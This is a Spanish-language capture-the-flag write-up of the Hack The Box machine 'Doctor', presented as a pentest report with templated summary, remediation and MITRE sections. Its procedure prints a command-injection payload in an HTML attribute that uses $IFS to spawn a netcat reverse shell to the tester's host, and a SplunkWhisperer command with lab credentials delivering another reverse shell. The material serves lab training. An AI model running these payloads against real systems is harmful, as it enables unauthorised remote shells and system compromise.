---
title: "Informe Técnico: Doctor (Hack The Box) — Pentesting & Exploit Analysis"
published: true
description: "Informe técnico profesional de auditoria sobre la maquina Doctor de Hack The Box: vector de entrada, PoC de explotacion, escalada y mitigaciones OffSec."
tags: cybersecurity, ctf, hackthebox, pentesting
series: "Hack The Box Walkthroughs"
cover_image: "https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/doctor/images/step_01.png"
---

# Informe Técnico de Seguridad Ofensiva: Doctor

![Hack The Box](https://img.shields.io/badge/Platform-Hack%20The%20Box-green?style=for-the-badge&logo=hackthebox)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge)
![Standards](https://img.shields.io/badge/Methodology-OffSec%20%2F%20PTES-purple?style=for-the-badge)
![Auditor](https://img.shields.io/badge/Assessor-araizcorp%20Offensive%20Security-blue?style=for-the-badge)

**Evaluación de Seguridad Ofensiva y Penetration Testing** realizada sobre el entorno de laboratorio **Doctor** de **Hack The Box**, siguiendo los estándares de ejecución metodológica **OffSec PEN-200 (OSCP)** y **PTES (Penetration Testing Execution Standard)**.

---

## 📑 1. Resumen Ejecutivo (Executive Summary)

* **Objetivo de la Evaluación:** Identificar, documentar y explotar debilidades de seguridad en el host objetivo para evaluar el impacto sobre la confidencialidad, integridad y disponibilidad del sistema.
* **Calificación de Riesgo:** `CRÍTICO` (Acceso no autenticado que deriva en compromiso completo de la máquina y obtención de máximos privilegios administrativos).
* **Vector de Acceso Inicial:** Explotación de servicio de red
* **Vector de Elevación de Privilegios:** Escalada local de privilegios
* **Estado Final:** Compromiso total del objetivo (`User Proof` y `Root/System Proof` obtenidas exitosamente).

### Ficha Técnica de la Evaluación

| Parámetro | Detalle Técnico |
| :--- | :--- |
| **Host Objetivo** | Doctor |
| **Plataforma** | Hack The Box |
| **Sistema Operativo** | Linux |
| **Nivel de Dificultad** | Easy |
| **CVE(s) Involucrados** | N/A |
| **Vector de Entrada** | Explotación de servicio de red |
| **Mecanismo de Escalada** | Escalada local de privilegios |
| **Consultor / Auditor** | Pedro Araiz (`araizcorp`) |

---

## 🎯 2. Diagrama del Flujo de Compromiso (Attack Path)

```
[ Fase 1: Reconocimiento ]
         │
         ▼
[ Fase 2: Enumeración & Identificación de Vectores ]
         │─── Descubrimiento de servicios y análisis de superficie de ataque
         └─── Verificación de configuraciones erróneas y CVEs conocidos
         │
         ▼
[ Fase 3: Explotación Inicial (Foothold) ]
         │─── Ejecución del vector: Explotación de servicio de red
         └─── Establecimiento de Reverse Shell / Acceso de usuario
         │
         ▼
[ Fase 4: Escalada de Privilegios Local ]
         │─── Auditoría interna: Escalada local de privilegios
         └─── Elevación a privilegios de superusuario (root / SYSTEM)
         │
         ▼
[ Fase 5: Evidencia & Banderas ]
         └─── Captura de User Flag y Root Flag
```

---

## 🔬 3. Procedimiento Técnico y Evidencias Paso a Paso

Reconocimiento:

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/doctor/images/step_01.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/doctor/images/step_02.png)

> 
> 
> 
> # Comprobación de RCE y obtención de shell (resumen ordenado)
> 
> ## 1) Contexto y prueba inicial
> 
> - **Listener**: tienes un listener activo en tu equipo (10.10.14.8:4343).
> - **Prueba de RCE**: al enviar `id`, la respuesta fue el usuario **`web`**. Esto confirma **ejecución remota de comandos** (RCE) en el objetivo bajo ese usuario.
> 
> ## 2) Payload usado para intentar la shell
> 
> El payload que enviaste (embebido en un atributo HTML) fue:
> 
> ```html
> html
> CopiarEditar
> <test src="http://10.10.14.8:4343/$(nc.traditional$IFS-e$IFS/bin/bash$IFS'10.10.14.8'$IFS'4343')">
> 
> ```
> 
> > El tag <test> es irrelevante como elemento HTML real; lo importante es que el valor del atributo acaba siendo evaluado por un shell en el servidor (por cómo la app procesa la entrada), y por eso se ejecuta lo que hay dentro de $(...).
> > 
> 
> ### Qué hace cada parte
> 
> - `$( ... )`: **sustitución de comando** de shell. Todo lo que haya dentro se **ejecuta** y su salida sustituye a la expresión.
> - `nc.traditional`: variante de **netcat** que **sí** soporta `e`.
> - `$IFS`: variable interna del shell (**Input Field Separator**). Por defecto equivale a un separador en blanco (espacio/tab/nueva línea).
>     - Uso aquí: **evitar escribir espacios literales** (que a veces rompen el payload o están filtrados).
>     - Ejemplo: `nc.traditional$IFS-e$IFS/bin/bash` → el shell lo interpreta como `nc.traditional -e /bin/bash`.
> - `e /bin/bash`: hace que netcat, al conectar, **ejecute** `/bin/bash` (reverse shell).
> - `'10.10.14.8' '4343'`: IP y puerto de tu listener, **entre comillas** para robustez (evita que la expansión rompa los argumentos).
> 
> En conjunto, el comando ejecutado dentro de `$(...)` es equivalente a:
> 
> ```
> bash
> CopiarEditar
> nc.traditional -e /bin/bash 10.10.14.8 4343
> 
> ```
> 
> y, si se ejecuta, abre una **conexión inversa** hacia tu listener, dándote una TTY interactiva como el usuario `web`.
> 
> ## 3) Por qué se usó `$IFS` y comillas
> 
> - **$IFS**: truco típico cuando **no puedes usar espacios** (por filtros, WAF, contextos de atributo, etc.). Al expandirse, el shell introduce el separador correcto y los argumentos quedan bien formados.
> - **Comillas**: añaden resiliencia en argumentos “delicados” (como la IP/puerto dentro de un contexto de parseo raro), reduciendo el riesgo de que algún carácter sea malinterpretado.
> 
> ## 4) Resultado observado
> 
> - Tu listener recibió actividad y el `id` devolvió `web`, lo que confirma RCE.
> - Al enviar el payload anterior, la intención era **elevar** de “RCE comprobado” a “shell interactiva” reutilizando netcat en el host víctima.
> 
> ## 5) Nota de estabilidad (lectura de tu intento)
> 
> - Comentaste que probaste con `nc.traditional` y que `nc` a secas “no hacía el trabajo”. Es coherente: no todas las variantes de netcat aceptan `e`; la de “traditional” sí.
> - El uso de `$IFS` y comillas fue para **sortear espacios** y **fortalecer** el payload en un contexto de inyección (atributo HTML → ejecución por shell en backend).
> 
> ---
> 
> ## TL;DR para tu write-up
> 
> 1. **Validé RCE**: `id` devolvió `web`.
> 2. **Intenté reverse shell** incrustando un comando en un atributo evaluado por shell:
>     
>     ```html
>     html
>     CopiarEditar
>     <test src="http://10.10.14.8:4343/$(nc.traditional$IFS-e$IFS/bin/bash$IFS'10.10.14.8'$IFS'4343')">
>     
>     ```
>     
> 3. **Técnicas usadas**: `$(...)` para ejecución, `nc.traditional` por soporte de `e`, `$IFS` para sustituir espacios, comillas para robustez.
> 4. **Objetivo**: obtener TTY inversa en 10.10.14.8:4343 como `web`.

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/doctor/images/step_03.png)

![Captura de pantalla 2025-08-13 164649.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/doctor/images/step_04.png)

299f6f6d90009bf51079e7b67e403855

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/doctor/images/step_05.png)

```jsx
python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.8 --username shaun --password Guitar123 --payload 'nc.traditional -e/bin/sh 10.10.14.8 443'

```

4a2e934af476d8d736737c05cf856d28

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/doctor/images/step_06.png)

---

## 🛡️ 4. Plan de Remediación y Recomendaciones de Hardening

### Acciones Tácticas Inmediatas
1. **Aplicación de Parches y Actualización:** Actualizar todos los servicios obsoletos y aplicar los parches correspondientes a las vulnerabilidades documentadas (N/A).
2. **Revisión de Permisos Críticos:** Eliminar permisos SUID/sudo innecesarios y auditar listas de control de acceso (ACLs) en directorios y archivos sensibles.
3. **Cierre de Superficie de Exposición:** Configurar firewalls a nivel de host para denegar puertos de administración o de depuración que no deban estar expuestos públicamente.

### Acciones Estratégicas y de Arquitectura
1. **Principio de Mínimo Privilegio (PoLP):** Configurar servicios y aplicaciones para que se ejecuten bajo cuentas de servicio con privilegios limitados sin acceso a shells interactivas.
2. **Segmentación de Red:** Aislar componentes críticos y servidores de aplicaciones en VLANs dedicadas con inspección de tráfico Este-Oeste.
3. **Monitorización Continua y EDR:** Implementar reglas de detección basadas en comportamiento para identificar ejecuciones anómalas de comandos, spawning de shells y tráfico de red no autorizado.

---

## 📊 5. Mapeo con Matriz MITRE ATT&CK

| Táctica | ID de Técnica | Nombre de Técnica | Aplicación en el Ejercicio |
| :--- | :--- | :--- | :--- |
| **Reconnaissance** | `T1595.002` | Vulnerability Scanning | Detección automatizada y manual de servicios mediante escaneo de puertos |
| **Initial Access** | `T1190` | Exploit Public-Facing Application | Explotación de vulnerabilidad en servicio de red expuesto (Explotación de servicio de red) |
| **Execution** | `T1059` | Command and Scripting Interpreter | Spawning de reverse shell interactiva para control del endpoint |
| **Privilege Escalation** | `T1068 / T1548` | Abuse Elevation Mechanism / Exploitation | Elevación de privilegios hacia superusuario (Escalada local de privilegios) |

---

© 2026 **araizcorp** — Documentación técnica desarrollada para preparación y consultoría de certificaciones **OffSec** (OSCP, OSEP, OSWE).
